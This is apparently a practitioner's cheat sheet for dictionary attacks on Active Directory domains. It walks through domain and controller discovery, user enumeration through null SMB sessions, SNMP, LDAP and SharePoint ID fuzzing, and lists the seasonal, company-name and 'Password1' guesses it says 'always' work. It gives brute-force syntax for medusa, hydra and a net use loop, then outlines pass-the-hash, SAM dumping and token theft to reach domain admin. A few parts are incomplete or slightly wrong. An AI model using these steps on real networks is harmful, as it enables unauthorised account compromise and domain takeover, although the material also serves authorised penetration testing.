Dictionary Attacks Against Active Directory
STEPS:
0 - Find Domains
1 - FIND DOMAIN CONTROLLERS 
2 - ENUMNERATE USERS
3 - CREATE A DICTIONARY
4 - PERFORM DICTIONARY ATTACK

ESCALATE WITH DOMAIN USER ACCOUNT

5 - LOGON ONTO SYSTEM
6 - ESCALATE TO DOMAIN ADMIN



------------------------------------------
FIND DOMAINS
------------------------------------------

#1 IPCONFIG
1. Review domain associate with DHCP.

#2 NMAP
1. Run RDNS scan: NMAP -sL <host or IP Range> -oA client_rnds
2. grep -i -v "()" client_rdns.gnmap | grep -i -v "nmap" | gawk -F "(" "{print $2}" | gawk -F ")" "{print $1}" | sed s/^\./:/1 | gawk -F ":" "{print $2}" | sort | uniq
3. script will show uniq domains

#3 Reverseraider on Backtrack - same general idea as option 2
1. Run ./reverseraider -r 192.168.1.100-110

#4 Wireshark
1. Sniff packets and import in to Network Minor to parse systems and domains.

#5 RDP
1. Remote desktop to a domain controller and review domains drop down.

#6 NLTEST  (gets trusted domains)
1. NLTEST /DOMAIN_TRUSTS <server> 

#7 NLTEST (gets partent domain for current system)
1. NLTEST /parentdomain 

#8 DNSWALK - (get dubdomains via domain transfer)
./dnswalk netspi.com.

------------------------------------------
FIND DOMAIN CONTROLLERS
------------------------------------------
I'm sure there are more ways to find domain
controllers, but I've listed 5 below:


#1 DNS LOOKUP
command : nslookup
syntax  : nslookup -type=SRV _ldap._tcp.<domain>
native  : All Windows flavors (to my knowledge)
comments: Does not require user to be on domain, although ldap doesnt guraentee ads, it is the case in 90% of instances.

#2 NLTEST
command : nltest
native  : Only in Windows 7/2k8 and later
syntax  : nltest /dclist: <domain>
comments: Does not require user to be on domain

#3 LDAP QUERY
command: adfind
syntax : adfind -b -sc dcdmp <domain> -gc | grep -i ">name:" | gawk -F " " "{print $2}" | sort | uniq
native : no - joeware tool
comment: Typically requires the user to be on a domain system, but can sometimes be done with an anonymous connection.

#4 NET GROUP
command: net group
syntax : net group "Domain Controllers" /domain
native : All Windows flavors (to my knowledge)
comment: Typically requires the user to be on a domain system, but could be done with just a domain user.

#5 FINDPDC etc

------------------------------------------
ENUMERATE USERS
------------------------------------------
Dictionary attacks are much more affective when you
actually know the user accounts.  Here are a few ways
to get a list from ADS.  The options below  don't all work everytime, but
usually at least one does. Also on a side note, you can get
a null smb login with the follow native Windows command: net use \\<ip>\IPC$ "" /user:""
It comes in handy quite a bit.

#1 RPC CALLS
tools  : 
	 Note: You may need to try all of these, because they seem to use differant RPC calls.          	 
	 gda -s (only if already on the host will give parsed list)
	 nmap --script smb-enum-users.nse <server>
	 superscan - GUI
	 null session + dumpacl
	 getacct - security friday
syntax : enum -U <server>
native : no
comment: All of these tools can be used with null smb logins. I like dumpacl the most (when it works) 
	 because it has a lot of greate filtering
         and export options. For more info on the differant RPC methods used by the tools goto:
	 http://nmap.org/nsedoc/scripts/smb-enum-users.html 

#2 SNMP
command: metasploit - url
	 snmpwalk - url
         mibbrowser - url
syntax : all have intuitive syntax
native : no
comment: Use public/private strings to connect and dump usernames.  This also work on LInux
         systems quite often.  Fuzzdb has a nice short list to try along with company specific 
         keywords. 
          

#3 LDAP
tools  : adfind
         ldap minor
	 ldap explorer
         softera ldap administrator
	 gda -l (if already on host -will give parsed list)
syntax : adfind -b dc=<domain>,dc=<com> -f "objectcategory=user" -gc | grep -i "sAMAccountName:" | gawk -F ":" "{print $2}" | gawk -F " " "{print $1}"| sort 
native : no
comment: Sometimes this can be done via an anonymous connection, but usually requires credentials.

#4 Sharepoint
tools: burp
native: short of
comment: This may or may not require authentication. 
         Sharepoint supports a user information form.  Very often all domain users can be enumerated
         by incrementing the id number.  I like to use burp to fuzz the id and grab the usernames.
         If the sharepoint site is accessible it can be a valid option.
         The form is pretty ez to find, but I'll add it to this list later.

#5 WMI

#6 NET USERs /domain
tools: net users, or net users /domain
native: yes
comment: This usually needs to be run on system that is on the domain.

5 BASIC DICTIONARY WORDS THAT ALWAYS WORK
------------------------------------------
The small dictionary below always gets me in everytime.  Also, don't forget
to respect the password policy! Below are guides for creating 5 small password list files.

#1 - SEASONAL COMBINATIONS
template: <season><year>
examples: Fall2011, Winter2011, Spring2011, Summer2011
Comments: This turns up hundreds of user accounts in larger environments

#2 - USERNAME AS PASSWORD
template: <username/loginname>
examples: username
Comments: This usually turns up a couple dozen accounts which are typically used to run services. 

#3 - THE TARGET COMPANIES NAME
template: <Companyname>, <Companyname>1, <Companyname>1
examples: Acme, Acme1, Acme12
comments: This usually turns up a couple dozen accounts which are often user and vendor accounts.
          Also, I encourge capitalizing the first charater - its helps meet basic password complexity 
	  requirements :). 

#4 - THE CLASSIC PASSWORD
template: <Password><number>
examples: Password, Password1, Password12, and P@ssword
comments: Sounds dump, but this still works. Also, I encourge 
	  capitalizing the first charater - its helps meet basic password complexity requirements :). 

#5 - BLANK/NULL
template: blank/null
example :
comments: This turns out less these days, but usually there is at least a few configured with no password.

Bruter instructions:
WARNING: Only test a max of 3 passwords at a time  unless no account lockout policy is in place.  Load list of users  enumerated earlier into bruter.  Set "max retry" to 1 and set "max attempt" to 1.  Load  3 password word list into a file.  Start.  Below are the password that should be attempted:

------------------------------------------
TOOLS FOR CONDUCTING DICTIONARY ATTACK
------------------------------------------
Everyone has their preferances.  Here are mine.

#1 MEDUSA 
tool    : MEDUSA - http://www.foofus.net/~jmk/medusa/medusa.html
syntax  : medusa -H hosts.txt -U users.txt -P passwords.txt -T 20 -t 10 -L -F -M smbnt
comments: Works, and is a little faster than bruter - it also support using 
          hashes instead of a traditional pw list which is pretty kule.

#2 BRUTER
tool    : BRUTER- http://sourceforge.net/projects/worawita/
syntax  : Easy to use GUI
comments: Say what you will this tool consistently works, but its a little slow.  

#3 HYDRA
tool    : HYDRA- http://thc.org/thc-hydra/
syntax  : hydra.exe -L users.txt -P passwords.txt -o credentials.txt <ip> ssh
comments: This can be a little buggy, but sometimes its works.

#4 
tool    : net use - native Windows command
syntax  : FOR /F "tokens=*" %a in ('type passwords.txt') do net user \\<ip>\IPC$ /user:<user> %a
comments: Its very slow, but it does work in a pinch.

------------------------------------------
LOGON ONTO SYSTEM
------------------------------------------
In order, I typically attempt worksations, win2k, win2k3, win2k8 server because of the way 
policies are usually applied to the systems.

#1 RDP or RDP + sethc.exe
#2 meterpreter + psexec
#3 mount c dump system/sam and pth with psexec

------------------------------------------
ESCALATE TO DOMAIN ADMIN
------------------------------------------
You can use GDA to find active domain admin sessions.

#1 - incognito
#2 - pth + incognito
